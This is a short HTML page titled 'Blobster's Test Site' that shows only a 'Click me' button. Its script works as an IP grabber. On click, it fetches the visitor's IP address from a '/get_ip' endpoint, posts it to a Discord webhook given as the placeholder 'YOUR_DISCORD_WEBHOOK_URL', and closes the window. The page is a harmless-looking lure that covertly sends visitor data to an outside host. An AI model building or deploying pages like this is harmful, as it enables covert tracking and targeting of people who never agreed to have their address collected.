<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blobster's Test Site</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: black;
            color: white;
        }

        #button {
            padding: 10px 20px;
            font-size: 20px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <button id="button" onclick="fetchIp()">Click me</button>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        function fetchIp() {
            $.ajax({
                url: '/get_ip',
                type: 'GET',
                success: function(response){
                    var ipAddress = response.ip;
                    sendToDiscord(ipAddress);
                    window.close(); // Close the window after sending the IP address
                }
            });
        }

        function sendToDiscord(ipAddress) {
            var webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
            var message = 'New IP Address: ' + ipAddress;

            $.ajax({
                url: webhookUrl,
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ content: message }),
                success: function(response) {
                    console.log('IP address sent to Discord webhook successfully.');
                }
            });
        }
    </script>
</body>
</html>
